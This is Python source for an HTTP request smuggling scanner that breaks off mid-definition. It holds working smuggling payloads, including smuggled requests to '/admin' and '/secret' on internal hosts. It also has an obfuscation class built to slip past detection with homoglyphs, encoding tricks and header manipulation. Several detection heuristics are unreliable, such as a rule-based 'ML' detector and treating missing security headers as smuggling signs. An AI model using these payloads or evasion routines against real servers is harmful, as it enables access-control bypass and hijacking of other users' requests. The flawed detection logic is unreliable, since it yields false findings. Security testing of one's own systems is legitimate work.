#!/usr/bin/env python3

import argparse
import json
import time
import os
import sys
import re
import socket
import ssl
import statistics
import csv
import hashlib
import base64
import random
import threading
import queue
from datetime import datetime
from urllib.error import URLError
from urllib.parse import urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from collections import defaultdict
from termcolor import cprint, colored
from pyfiglet import figlet_format
import colorama

colorama.init()


class Constants:
    def __init__(self):
        self.transfer_encoding = 'transfer_encoding'
        self.te_key = 'te_key'
        self.te_value = 'te_value'
        self.permute = 'permute'
        self.type = 'type'
        self.payload = 'payload'
        self.statuscode = 'statuscode'
        self.content_length_key = 'content_length_key'
        self.content_length = 'content_length'
        self.header_type = 'header_type'
        self.chunked_type = 'chunked_type'
        self.payload_chunk = 'payload_chunk'
        self.detection = 'detection'
        self.crlf = '\r\n'
        self.delayed_response_msg = '[Delayed Response] → Possible HTTP Request Smuggling'
        self.detecting = 'detecting...'
        self.ok = 'OK'
        self.magenta = 'magenta'
        self.yellow = 'yellow'
        self.white = 'white'
        self.red = 'red'
        self.cyan = 'cyan'
        self.blue = 'blue'
        self.green = 'green'
        self.reports = 'reports'
        self.output = '$Output'
        self.extenstion = '.txt'
        self.file_not_found = 'File not found'
        self.python_version_error_msg = "HRS Detection tool requires Python 3.x"
        self.invalid_method_type = 'Invalid method type, please enter correct http method (eg GET or POST)'
        self.invalid_url_options = "Invalid options specify either (-u) or (--urls)"
        self.invalid_retry_count = 'Invalid retry count, please specify at least 1 retry count'
        self.invalid_target_url = "Invalid target url, please specify the valid url by following this example - http[s]://example.com"
        self.keyboard_interrupt = 'KeyboardInterrupt'
        self.dis_connected = 'DISCONNECTED'


class SocketConnection:
    def __init__(self, proxy=None):
        self.context = None
        self.data = None
        self.s = None
        self.ssl = None
        self.ssl_enable = False
        self.proxy = proxy
        self.timeout = 10
        self.buffer_size = 4096

    def connect(self, host, port, timeout):
        self.timeout = timeout
        try:
            if self.proxy:
                return self._connect_via_proxy(host, port)
            
            if port == 443:
                self.ssl_enable = True
                self.context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                self.s = socket.create_connection((host, port))
                self.ssl = self.context.wrap_socket(self.s, server_hostname=host)
                self.ssl.settimeout(timeout)
            else:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.settimeout(timeout)
                self.s.connect((host, port))
            return self.s
        except socket.error as msg:
            print(f'Socket Error → {msg}')
            return None
    
    def _connect_via_proxy(self, host, port):
        """Connect through HTTP proxy"""
        try:
            proxy_parts = self.proxy.replace('http://', '').replace('https://', '').split(':')
            proxy_host = proxy_parts[0]
            proxy_port = int(proxy_parts[1]) if len(proxy_parts) > 1 else 8080
            
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.settimeout(self.timeout)
            self.s.connect((proxy_host, proxy_port))
            
            # Send CONNECT request
            connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
            self.s.send(connect_request.encode())
            response = self.s.recv(1024).decode()
            
            if "200 Connection established" not in response:
                raise Exception(f"Proxy connection failed: {response}")
            
            if port == 443:
                self.ssl_enable = True
                self.context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                self.ssl = self.context.wrap_socket(self.s, server_hostname=host)
                self.ssl.settimeout(self.timeout)
            else:
                self.s.settimeout(self.timeout)
            
            return self.s
        except Exception as e:
            print(f'Proxy Error → {e}')
            return None

    def send_payload(self, payload):
        try:
            if self.ssl_enable:
                self.ssl.send(str(payload).encode())
            else:
                self.s.send(str(payload).encode())
        except BrokenPipeError:
            # Connection broken, try to reconnect
            pass

    def receive_data(self, buffer_size=None):
        if buffer_size is None:
            buffer_size = self.buffer_size
        try:
            if self.ssl_enable:
                self.ssl.settimeout(None)
                self.data = b''
                while True:
                    chunk = self.ssl.recv(buffer_size)
                    if not chunk:
                        break
                    self.data += chunk
            else:
                self.s.settimeout(None)
                self.data = b''
                while True:
                    chunk = self.s.recv(buffer_size)
                    if not chunk:
                        break
                    self.data += chunk
        except socket.timeout:
            pass
        except Exception as e:
            pass
        return self.data

    @staticmethod
    def detect_hrs_vulnerability(start_time, timeout):
        if time.time() - start_time >= timeout:
            return True
        return False

    def close_connection(self):
        try:
            if self.ssl_enable:
                self.ssl.close()
                del self.ssl
            self.s.close()
            del self.s
        except:
            pass


class Utils:
    def __init__(self):
        self.title = "{:<1}{}".format("", "Smuggling")
        self.author = "Anshuman Pattnaik / @anspattnaik"
        self.blog = "https://hackbotone.com/blog/http-request-smuggling-detection-tool"
        self.version = "3.0"

    def print_header(self):
        cprint(figlet_format(self.title.center(20), font='cybermedium'), 'red', attrs=['bold'])

        header_key_color = Constants().blue
        header_value_color = Constants().yellow

        print("{:<12}{:<23}{:<17}{}".format('', colored('Author', header_key_color, attrs=['bold']),
                                            colored(':', header_key_color, attrs=['bold']),
                                            colored(self.author, header_value_color, attrs=['bold'])))
        print("{:<12}{:<23}{:<17}{}".format('', colored('Blog', header_key_color, attrs=['bold']),
                                            colored(':', header_key_color, attrs=['bold']),
                                            colored(self.blog, header_value_color, attrs=['bold'])))
        print("{:<12}{:<23}{:<17}{}".format('', colored('Version', header_key_color, attrs=['bold']),
                                            colored(':', header_key_color, attrs=['bold']),
                                            colored(self.version, header_value_color, attrs=['bold'])))
        print("{:<1}{}".format('', colored("___________________________________________________________________________________", 'cyan', attrs=['bold'])))
        print("\n")

    @staticmethod
    def write_payload(file_name, payload):
        if not os.path.exists(os.path.dirname(file_name)):
            try:
                os.makedirs(os.path.dirname(file_name))
            except OSError as e:
                print(e)
        with open(file_name, "wb") as f:
            f.write(bytes(str(payload), 'utf-8'))

    @staticmethod
    def url_parser(url):
        parser = {}
        try:
            port = 80
            u_parser = urlparse(url)
            if u_parser.scheme == 'https':
                port = 443
            if u_parser.port is not None:
                port = u_parser.port

            host = u_parser.hostname
            parser["host"] = host
            parser["port"] = port

            path = u_parser.path
            query = '?' + u_parser.query if u_parser.query else ''
            fragment = '#' + u_parser.fragment if u_parser.fragment else ''
            uri_path = f'{path}{query}{fragment}'

            if len(path) > 0:
                parser["path"] = uri_path
            else:
                parser["path"] = '/'
            return json.dumps(parser)
        except URLError as e:
            print(f'Invalid URL: {e}')
            return Constants().invalid_target_url

    @staticmethod
    def read_target_list(file_name):
        try:
            with open(file_name) as urls_list:
                return [u.rstrip('\n') for u in urls_list]
        except FileNotFoundError as _:
            return Constants().file_not_found
    
    @staticmethod
    def generate_session_id():
        """Generate a unique session ID for tracking"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:8]


class HTTP2Handler:
    """HTTP/2 protocol support for smuggling detection"""
    
    def __init__(self):
        self.supported = False
        try:
            import h2.connection
            import h2.config
            self.supported = True
            self.h2 = h2
        except ImportError:
            pass
    
    def is_supported(self):
        return self.supported
    
    def detect_http2_smuggling(self, host, port, path, method, timeout):
        """Detect HTTP/2 specific smuggling techniques"""
        if not self.supported:
            return {"error": "HTTP/2 library not installed. Install: pip install h2"}
        
        try:
            config = self.h2.config.H2Configuration(client_side=True)
            conn = self.h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            
            # Create socket
            sock = socket.create_connection((host, port))
            sock.settimeout(timeout)
            
            # SSL wrap if needed
            if port == 443:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Send initial connection
            sock.send(conn.data_to_send())
            
            # Send smuggling attempt
            headers = [
                (':method', method),
                (':path', path),
                (':scheme', 'https' if port == 443 else 'http'),
                (':authority', host),
                ('transfer-encoding', 'chunked'),
                ('content-length', '1'),
            ]
            
            conn.send_headers(stream_id=1, headers=headers, end_stream=False)
            conn.send_data(stream_id=1, data=b'0\r\n\r\n', end_stream=True)
            sock.send(conn.data_to_send())
            
            # Receive response
            response_data = b''
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response_data += data
                except socket.timeout:
                    break
            
            sock.close()
            
            # Check for smuggling indicators in HTTP/2
            if b'400' in response_data or b'500' in response_data:
                return {"vulnerable": True, "response": response_data[:200].decode(errors='ignore')}
            
            return {"vulnerable": False, "response": response_data[:200].decode(errors='ignore')}
            
        except Exception as e:
            return {"error": str(e)}


class WebSocketHandler:
    """WebSocket protocol support"""
    
    def detect_websocket_smuggling(self, host, port, path, timeout):
        """Detect WebSocket smuggling techniques"""
        try:
            # WebSocket upgrade request with smuggling
            upgrade_request = f"""GET {path} HTTP/1.1
Host: {host}:{port}
Upgrade: websocket
Connection: Upgrade, Transfer-Encoding
Transfer-Encoding: chunked
Content-Length: 1

0

"""
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            
            if port == 443:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.send(upgrade_request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()
            
            # Check for smuggling indicators
            if "101 Switching Protocols" in response:
                # WebSocket upgrade successful, check for smuggling
                if "Transfer-Encoding" in response or "Content-Length" in response:
                    return {"vulnerable": True, "response": response}
            
            return {"vulnerable": False, "response": response}
            
        except Exception as e:
            return {"error": str(e)}


class MLDetector:
    """Machine learning based detection"""
    
    def __init__(self):
        self.features = []
        self.model = None
        self.training_data = []
        self.is_trained = False
        self.patterns = self._initialize_patterns()
    
    def _initialize_patterns(self):
        """Initialize known smuggling patterns"""
        return {
            'cl_te_patterns': [
                r'Content-Length:\s*\d+\s*Transfer-Encoding:\s*chunked',
                r'Transfer-Encoding:\s*chunked\s*Content-Length:\s*\d+',
                r'Content-Length:\s*\d+\s*Transfer-Encoding:\s*identity',
            ],
            'te_cl_patterns': [
                r'Transfer-Encoding:\s*chunked\s*Content-Length:\s*\d+',
                r'Content-Length:\s*\d+\s*Transfer-Encoding:\s*chunked',
            ],
            'anomaly_patterns': [
                r'Content-Length:\s*0\s*Transfer-Encoding:\s*chunked',
                r'Transfer-Encoding:\s*chunked\s*Content-Length:\s*0',
                r'Connection:\s*close.*Transfer-Encoding:\s*chunked',
            ]
        }
    
    def extract_features(self, request, response):
        """Extract features for ML model"""
        features = {
            'response_time': 0,
            'status_code': 0,
            'header_count': 0,
            'content_length': 0,
            'chunk_count': 0,
            'header_anomalies': 0,
            'encoding_indicators': 0,
            'error_patterns': 0,
            'has_transfer_encoding': 0,
            'has_content_length': 0,
            'has_connection_close': 0,
            'response_size': 0,
            'header_size': 0,
            'body_size': 0,
        }
        
        # Extract from response
        if response:
            response_str = response.decode('utf-8', errors='ignore') if isinstance(response, bytes) else str(response)
            
            features['response_size'] = len(response_str)
            
            # Check for headers
            if 'Content-Length' in response_str:
                features['has_content_length'] = 1
            if 'Transfer-Encoding' in response_str:
                features['has_transfer_encoding'] = 1
            if 'Connection: close' in response_str:
                features['has_connection_close'] = 1
            
            # Check for errors
            if '400' in response_str or '500' in response_str:
                features['error_patterns'] = 1
            
            # Check for anomalies
            for pattern in self.patterns['anomaly_patterns']:
                if re.search(pattern, response_str, re.IGNORECASE):
                    features['header_anomalies'] += 1
        
        return features
    
    def train_model(self, training_data):
        """Train ML model (simplified version)"""
        self.training_data = training_data
        self.is_trained = True
        # In production, this would use scikit-learn or similar
        return True
    
    def predict(self, features):
        """Predict if request is smuggling using pattern matching"""
        if not self.is_trained:
            return {"vulnerable": False, "confidence": 0}
        
        # Simple rule-based prediction
        score = 0
        max_score = 0
        
        # Check features
        if features.get('header_anomalies', 0) > 0:
            score += 20
        if features.get('error_patterns', 0) > 0:
            score += 15
        if features.get('has_transfer_encoding', 0) and features.get('has_content_length', 0):
            score += 25
        if features.get('response_size', 0) < 100:
            score += 10
        if features.get('has_connection_close', 0):
            score += 10
        
        confidence = min(score, 100)
        vulnerable = confidence > 40
        
        return {
            "vulnerable": vulnerable,
            "confidence": confidence,
            "score": score
        }


class AdvancedPayloads:
    def __init__(self):
        self.cl_te_payloads = [
            {"payload": "0\r\n\r\n", "content_length": 1},
            {"payload": "0\r\n\r\nX", "content_length": 2},
            {"payload": "3\r\nabc\r\n0\r\n\r\n", "content_length": 5},
            {"payload": "0\r\n\r\n\r\nG", "content_length": 6},
            {"payload": "0\r\n\r\n\r\n0\r\n\r\n", "content_length": 7},
            {"payload": "5\r\nhello\r\n0\r\n\r\n", "content_length": 5},
            {"payload": "A\r\n0123456789\r\n0\r\n\r\n", "content_length": 10},
            {"payload": "1\r\nZ\r\nQ\r\n\r\n", "content_length": 5},
            {"payload": "F\r\n0123456789ABCDE\r\n0\r\n\r\n", "content_length": 15},
            {"payload": "2\r\nab\r\n0\r\n\r\nX", "content_length": 5},
            {"payload": "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: internal\r\n\r\n", "content_length": 1},
            {"payload": "0\r\n\r\nGET /secret HTTP/1.1\r\nHost: admin\r\n\r\n", "content_length": 1},
        ]
        
        self.te_cl_payloads = [
            {"payload": "0\r\n\r\n\r\nG", "content_length": 6},
            {"payload": "0\r\n\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n", "content_length": 6},
            {"payload": "0\r\n\r\n\r\nPOST /secret HTTP/1.1\r\nHost: admin\r\n", "content_length": 6},
        ]
    
    def generate_obfuscated_payloads(self):
        """Generate payloads with various obfuscation techniques"""
        payloads = []
        obfuscations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: chunked, identity",
            "Transfer-Encoding: \r\nchunked",
            "Transfer-Encoding: \tchunked",
            "Transfer-Encoding: chunked\r\nConnection: close",
            "Transfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded",
            "Transfer-Encoding: chunked\r\nX-Forwarded-For: 127.0.0.1",
            "Transfer-Encoding: chunked\r\nUser-Agent: Mozilla/5.0",
            "Transfer-Encoding: chunked\r\nAccept: */*",
            "Transfer-Encoding: chunked\r\nAccept-Language: en-US",
            "Transfer-Encoding: chunked\r\nAccept-Encoding: gzip, deflate",
            "Transfer-Encoding: chunked\r\nCache-Control: no-cache",
            "Transfer-Encoding: chunked\r\nPragma: no-cache",
            "Transfer-Encoding: chunked\r\nReferer: https://google.com",
            "Transfer-Encoding: chunked\r\nOrigin: https://example.com",
        ]
        for ob in obfuscations:
            payloads.append(ob)
        return payloads
    
    def generate_chunked_payloads(self, base_payload):
        """Generate chunked encoding variations"""
        variations = []
        chunk_sizes = [1, 2, 3, 5, 10, 16, 32, 64]
        
        for size in chunk_sizes:
            if len(base_payload) > 0:
                chunks = [base_payload[i:i+size] for i in range(0, len(base_payload), size)]
                chunked = "\r\n".join([f"{len(chunk):x}\r\n{chunk}" for chunk in chunks])
                chunked += "\r\n0\r\n\r\n"
                variations.append(chunked)
        
        return variations


class TimingAnalyzer:
    def __init__(self):
        self.baseline_requests = 10
        self.sample_count = 3
        self.mean = 0
        self.stdev = 0
        self.threshold = 0
        self.history = []
        self.anomaly_threshold = 1.5  # 50% above baseline
        
    def establish_baseline(self, host, port, path, method, timeout):
        """Establish normal response time baseline with statistical analysis"""
        times = []
        constants = Constants()
        
        print(f"  Establishing baseline with {self.baseline_requests} requests...")
        
        for i in range(self.baseline_requests):
            try:
                start = time.time()
                connection = SocketConnection()
                connection.connect(host, port, timeout)
                headers = f'{method} {path} HTTP/1.1{constants.crlf}'
                headers += f'Host: {host}{constants.crlf}'
                headers += f'User-Agent: Mozilla/5.0 (compatible; HRS-Detector/3.0){constants.crlf}'
                headers += f'Accept: */*{constants.crlf}'
                headers += f'Accept-Language: en-US,en;q=0.9{constants.crlf}'
                headers += f'Accept-Encoding: gzip, deflate{constants.crlf}'
                headers += f'Connection: close{constants.crlf}{constants.crlf}'
                connection.send_payload(headers)
                connection.receive_data()
                end = time.time()
                response_time = end - start
                times.append(response_time)
                connection.close_connection()
                time.sleep(0.3 + random.random() * 0.2)
            except Exception as e:
                continue
        
        if len(times) > 1:
            self.mean = statistics.mean(times)
            self.stdev = statistics.stdev(times) if len(times) > 1 else 0
            self.threshold = self.mean + (self.stdev * 2)  # 2 sigma
            self.history.extend(times)
        else:
            self.mean = 1.0
            self.stdev = 0.5
            self.threshold = 2.5
        
        print(f"  Baseline: mean={self.mean:.3f}s, stdev={self.stdev:.3f}s, threshold={self.threshold:.3f}s")
        return self.threshold
    
    def detect_anomaly(self, response_time, threshold=None):
        """Detect timing anomalies indicating smuggling"""
        if threshold is None:
            threshold = self.threshold
        
        # Multiple detection methods
        if response_time > threshold * self.anomaly_threshold:
            return True
        
        if self.stdev > 0 and response_time > self.mean + (self.stdev * 3):
            return True
        
        # Check against history
        if len(self.history) > 3:
            history_mean = statistics.mean(self.history[-5:])
            if response_time > history_mean * 2:
                return True
        
        return False
    
    def add_to_history(self, response_time):
        """Add response time to history for adaptive analysis"""
        self.history.append(response_time)
        if len(self.history) > 50:
            self.history = self.history[-50:]


class ResponseAnalyzer:
    def __init__(self):
        self.smuggling_indicators = [
            "400 Bad Request",
            "500 Internal Server Error",
            "Content-Length: 0",
            "Connection: close",
            "Transfer-Encoding: chunked",
            "X-Smuggling-Detected",
            "Request Rejected",
            "Malformed Request",
            "Invalid Request",
            "HTTP/1.1 411 Length Required",
            "HTTP/1.1 505 HTTP Version Not Supported",
            "HTTP/1.1 501 Not Implemented",
            "HTTP/1.1 413 Payload Too Large",
            "HTTP/1.1 414 URI Too Long",
            "HTTP/1.1 431 Request Header Fields Too Large",
        ]
        
        self.smuggling_patterns = {
            'cl_te': [
                r'Content-Length:\s*\d+\s*Transfer-Encoding:\s*chunked',
                r'Transfer-Encoding:\s*chunked\s*Content-Length:\s*\d+',
            ],
            'te_cl': [
                r'Transfer-Encoding:\s*chunked\s*Content-Length:\s*\d+',
                r'Content-Length:\s*\d+\s*Transfer-Encoding:\s*chunked',
            ],
            'duplicate_headers': [
                r'Content-Length:\s*\d+\s*Content-Length:\s*\d+',
                r'Transfer-Encoding:\s*\w+\s*Transfer-Encoding:\s*\w+',
            ]
        }
        
    def analyze_response(self, response_data):
        """Analyze response for smuggling indicators"""
        indicators_found = []
        
        if not response_data:
            return ["No response received"]
        
        try:
            response_str = response_data.decode('utf-8', errors='ignore')
        except:
            response_str = str(response_data)
        
        # Check for HTTP errors
        if "400" in response_str or "500" in response_str:
            indicators_found.append("error_response")
            # Check specific error types
            if "400 Bad Request" in response_str:
                indicators_found.append("bad_request")
            elif "500 Internal Server Error" in response_str:
                indicators_found.append("internal_error")
        
        # Check for Content-Length mismatch
        content_length_match = re.search(r'Content-Length: (\d+)', response_str, re.IGNORECASE)
        actual_length = len(response_str)
        if content_length_match:
            declared_length = int(content_length_match.group(1))
            if declared_length != actual_length:
                indicators_found.append("content_length_mismatch")
                indicators_found.append(f"declared_{declared_length}_actual_{actual_length}")
        
        # Check for chunked encoding indicators
        if "Transfer-Encoding: chunked" in response_str:
            indicators_found.append("chunked_response")
        
        # Check for missing security headers
        if "X-Frame-Options" not in response_str:
            indicators_found.append("missing_xframe_options")
        if "X-XSS-Protection" not in response_str:
            indicators_found.append("missing_xss_protection")
        if "X-Content-Type-Options" not in response_str:
            indicators_found.append("missing_content_type_options")
        
        # Check for smuggling patterns
        for pattern_name, patterns in self.smuggling_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_str, re.IGNORECASE):
                    indicators_found.append(f"pattern_{pattern_name}")
        
        # Check for smuggling specific indicators
        for indicator in self.smuggling_indicators:
            if indicator in response_str:
                indicator_name = indicator.lower().replace(' ', '_').replace('/', '_')
                indicators_found.append(f"found_{indicator_name}")
        
        # Check for unusual header combinations
        if "Content-Length" in response_str and "Transfer-Encoding" in response_str:
            indicators_found.append("both_length_headers")
        
        if "Connection: close" in response_str and "Transfer-Encoding" in response_str:
            indicators_found.append("close_with_chunked")
        
        return list(set(indicators_found))


class ThreatDetector:
    def __init__(self):
        self.threat_types = ['CL.TE', 'TE.CL', 'TE.TE', 'CL.CL', 'CL.0', 'TE.0']
        
    def detect_cl_te(self, host, port, path, method, timeout):
        """Detect CL.TE smuggling"""
        constants = Constants()
        payloads = [
            "0\r\n\r\n",
            "0\r\n\r\nX",
            "3\r\nabc\r\n0\r\n\r\n",
            "1\r\nZ\r\nQ\r\n\r\n",
        ]
        
        for payload in payloads:
            try:
                headers = f'{method} {path} HTTP/1.1{constants.crlf}'
                headers += f'Host: {host}{constants.crlf}'
                headers += f'Content-Length: 1{constants.crlf}'
                headers += f'Transfer-Encoding: chunked{constants.crlf}{constants.crlf}'
                smuggle_body = headers + payload
                
                start = time.time()
                connection = SocketConnection()
                connection.connect(host, port, timeout)
                connection.send_payload(smuggle_body)
                response = connection.receive_data()
                end = time.time()
                connection.close_connection()
                
                response_time = end - start
                if response_time > timeout * 0.7:
                    return True
            except Exception as e:
                continue
        
        return False
    
    def detect_te_cl(self, host, port, path, method, timeout):
        """Detect TE.CL smuggling"""
        constants = Constants()
        payloads = [
            "0\r\n\r\n\r\nG",
            "0\r\n\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
            "0\r\n\r\n\r\nPOST /secret HTTP/1.1\r\nHost: admin\r\n",
        ]
        
        for payload in payloads:
            try:
                headers = f'{method} {path} HTTP/1.1{constants.crlf}'
                headers += f'Host: {host}{constants.crlf}'
                headers += f'Content-Length: {len(payload) + 6}{constants.crlf}'
                headers += f'Transfer-Encoding: chunked{constants.crlf}{constants.crlf}'
                smuggle_body = headers + payload
                
                start = time.time()
                connection = SocketConnection()
                connection.connect(host, port, timeout)
                connection.send_payload(smuggle_body)
                response = connection.receive_data()
                end = time.time()
                connection.close_connection()
                
                response_time = end - start
                if response_time > timeout * 0.7:
                    return True
            except Exception as e:
                continue
        
        return False
    
    def detect_te_te(self, host, port, path, method, timeout):
        """Detect TE.TE smuggling"""
        constants = Constants()
        payload = "0\r\n\r\n"
        
        try:
            headers = f'{method} {path} HTTP/1.1{constants.crlf}'
            headers += f'Host: {host}{constants.crlf}'
            headers += f'Transfer-Encoding: chunked{constants.crlf}'
            headers += f'Transfer-Encoding: x{constants.crlf}{constants.crlf}'
            smuggle_body = headers + payload
            
            start = time.time()
            connection = SocketConnection()
            connection.connect(host, port, timeout)
            connection.send_payload(smuggle_body)
            response = connection.receive_data()
            end = time.time()
            connection.close_connection()
            
            response_time = end - start
            if response_time > timeout * 0.7:
                return True
        except Exception as e:
            pass
        
        return False
    
    def detect_cl_cl(self, host, port, path, method, timeout):
        """Detect CL.CL smuggling"""
        constants = Constants()
        payload = "0\r\n\r\n"
        
        try:
            headers = f'{method} {path} HTTP/1.1{constants.crlf}'
            headers += f'Host: {host}{constants.crlf}'
            headers += f'Content-Length: 1{constants.crlf}'
            headers += f'Content-Length: {len(payload) + 6}{constants.crlf}{constants.crlf}'
            smuggle_body = headers + payload
            
            start = time.time()
            connection = SocketConnection()
            connection.connect(host, port, timeout)
            connection.send_payload(smuggle_body)
            response = connection.receive_data()
            end = time.time()
            connection.close_connection()
            
            response_time = end - start
            if response_time > timeout * 0.7:
                return True
        except Exception as e:
            pass
        
        return False
    
    def detect_cl_0(self, host, port, path, method, timeout):
        """Detect CL with zero content length"""
        constants = Constants()
        payload = ""
        
        try:
            headers = f'{method} {path} HTTP/1.1{constants.crlf}'
            headers += f'Host: {host}{constants.crlf}'
            headers += f'Content-Length: 0{constants.crlf}'
            headers += f'Transfer-Encoding: chunked{constants.crlf}{constants.crlf}'
            smuggle_body = headers + payload
            
            start = time.time()
            connection = SocketConnection()
            connection.connect(host, port, timeout)
            connection.send_payload(smuggle_body)
            response = connection.receive_data()
            end = time.time()
            connection.close_connection()
            
            response_time = end - start
            if response_time > timeout * 0.7:
                return True
        except Exception as e:
            pass
        
        return False
    
    def detect_te_0(self, host, port, path, method, timeout):
        """Detect TE with zero content length"""
        constants = Constants()
        payload = "0\r\n\r\n\r\n"
        
        try:
            headers = f'{method} {path} HTTP/1.1{constants.crlf}'
            headers += f'Host: {host}{constants.crlf}'
            headers += f'Content-Length: 1{constants.crlf}'
            headers += f'Transfer-Encoding: chunked{constants.crlf}{constants.crlf}'
            smuggle_body = headers + payload
            
            start = time.time()
            connection = SocketConnection()
            connection.connect(host, port, timeout)
            connection.send_payload(smuggle_body)
            response = connection.receive_data()
            end = time.time()
            connection.close_connection()
            
            response_time = end - start
            if response_time > timeout * 0.7:
                return True
        except Exception as e:
            pass
        
        return False
    
    def run_comprehensive_scan(self, host, port, path, method, timeout):
        """Run all detection techniques"""
        results = {}
        detection_methods = {
            'CL.TE': self.detect_cl_te,
            'TE.CL': self.detect_te_cl,
            'TE.TE': self.detect_te_te,
            'CL.CL': self.detect_cl_cl,
            'CL.0': self.detect_cl_0,
            'TE.0': self.detect_te_0,
        }
        
        print("  Running comprehensive threat detection...")
        for threat_type, detection_method in detection_methods.items():
            try:
                print(f"    Testing {threat_type}...", end=" ")
                is_vulnerable = detection_method(host, port, path, method, timeout)
                results[threat_type] = is_vulnerable
                status = "VULNERABLE" if is_vulnerable else "SAFE"
                color = 'red' if is_vulnerable else 'green'
                print(colored(status, color))
            except Exception as e:
                results[threat_type] = f"Error: {str(e)}"
                print(colored(f"ERROR: {str(e)}", 'yellow'))
        
        return results


class PayloadObfuscator:
    def __init__(self):
        self.obfuscation_techniques = [
            self.chunk_encoding_variations,
            self.header_case_manipulation,
            self.whitespace_injection,
            self.unicode_manipulation,
            self.encoding_manipulation,
            self.header_order_manipulation,
            self.duplicate_header_injection,
            self.comment_injection,
        ]
    
    def chunk_encoding_variations(self, payload):
        """Generate chunk encoding variations"""
        variations = []
        chunk_sizes = [1, 3, 5, 10, 16, 32, 64]
        
        for size in chunk_sizes:
            if len(payload) > 0:
                chunks = [payload[i:i+size] for i in range(0, len(payload), size)]
                chunked = "\r\n".join([f"{len(chunk):x}\r\n{chunk}" for chunk in chunks])
                chunked += "\r\n0\r\n\r\n"
                variations.append(chunked)
        
        return variations
    
    def header_case_manipulation(self, payload):
        """Generate case variations of headers"""
        variations = []
        header_patterns = [
            'Transfer-Encoding',
            'Content-Length',
            'Connection',
            'Host',
            'User-Agent',
            'Content-Type',
            'Accept',
            'Accept-Encoding',
        ]
        
        for header in header_patterns:
            if header.lower() in payload.lower():
                variations.extend([
                    payload.replace(header, header.upper()),
                    payload.replace(header, header.lower()),
                    payload.replace(header, header.title()),
                    payload.replace(header, ''.join(c.upper() if i%2 else c.lower() for i, c in enumerate(header))),
                    payload.replace(header, header.replace('-', '_')),
                    payload.replace(header, header.replace(' ', '')),
                ])
        
        return variations
    
    def whitespace_injection(self, payload):
        """Inject whitespace to bypass detection"""
        variations = []
        whitespace_variants = [
            (' ', ' '),
            (':', ': '),
            (':', ':\t'),
            (':', ' : '),
            ('\r\n', '\r\n '),
            ('\r\n', '\r\n\t'),
            ('=', ' = '),
            ('=', '=\t'),
        ]
        
        for search, replace in whitespace_variants:
            if search in payload:
                variations.append(payload.replace(search, replace))
        
        return variations
    
    def unicode_manipulation(self, payload):
        """Unicode obfuscation techniques"""
        variations = []
        homoglyphs = {
            'e': ['é', 'è', 'ê', 'ë', 'е', 'ę', 'ė', 'ē'],
            'a': ['á', 'à', 'â', 'ä', 'а', 'æ', 'ã', 'å'],
            'i': ['í', 'ì', 'î', 'ï', 'і', 'į', 'ī'],
            'o': ['ó', 'ò', 'ô', 'ö', 'о', 'ø', 'ō', 'õ'],
            'c': ['ç', 'ć', 'č', 'с', 'ċ'],
            'n': ['ñ', 'ń', 'ņ', 'ŋ'],
            's': ['ş', 'š', 'ś', 'ș', 'ſ'],
            't': ['ţ', 'ť', 'ț'],
            'u': ['ú', 'ù', 'û', 'ü', 'ų', 'ū'],
            'y': ['ý', 'ÿ', 'ŷ'],
            'z': ['ź', 'ż', 'ž'],
        }
        
        for char, replacements in homoglyphs.items():
            for replacement in replacements:
                variation = payload.replace(char, replacement)
                if variation != payload:
                    variations.append(variation)
        
        return variations
    
    def encoding_manipulation(self, payload):
        """URL encoding and double encoding"""
        variations = []
        chars_to_encode = ['%', ' ', ':', '\r', '\n', '\t', '=', '&', '?', '#', '/']
        
        # URL encode
        for char in chars_to_encode:
            if char in payload:
                encoded = quote(char)
                variations.append(payload.replace(char, encoded))
                # Double encode
                double_encoded = quote(quote(char))
                variations.append(payload.replace(char, double_encoded))
        
        # Base64 encode (for specific parts)
        if len(payload) > 10:
            try:
                b64 = base64.b64encode(payload.encode()).decode()
                variations.append(f"base64://{b64}")
            except:
                pass
        
        return variations
    
    def header_order_manipulation(self, payload):
        """Change header order"""
        variations = []
        lines = payload.split('\r\n')
        if len(lines) > 3:
            for i in range(1, len(lines)-1):
                for j in range(i+1, len(lines)):
                    if ':' in lines[i] and ':' in lines[j]:
                        new_lines = lines.copy()
                        new_lines[i], new_lines[j] = new_lines[j], new_lines[i]
                        variations.append('\r\n'.join(new_lines))
        
        return variations
    
    def duplicate_header_injection(self, payload):
        """Inject duplicate headers"""
        variations = []
        header_patterns = ['Content-Length', 'Transfer-Encoding', 'Connection']
        
        for header in header_patterns:
            if header in payload:
                # Add duplicate header
                duplicate = f"{header}: 0\r\n"
                # Find position to insert
                lines = payload.split('\r\n')
                for i, line in enumerate(lines):
                    if line.startswith(header):
                        new_lines = lines.copy()
                        new_lines.insert(i, duplicate)
                        variations.append('\r\n'.join(new_lines))
        
        return variations
    
    def comment_injection(self, payload):
        """Inject HTTP comments for obfuscation"""
        variations = []
        comments = ['(comment)', '/*comment*/', '<!--comment-->', '#comment']
        
        for comment in comments:
            for char in [' ', ':', '=', '\r\n']:
                if char in payload:
                    variation = payload.replace(char, f"{char}{comment}")
                    variations.append(variation)
        
        return variations
    
    def generate_obfuscated_payloads(self, base_payload):
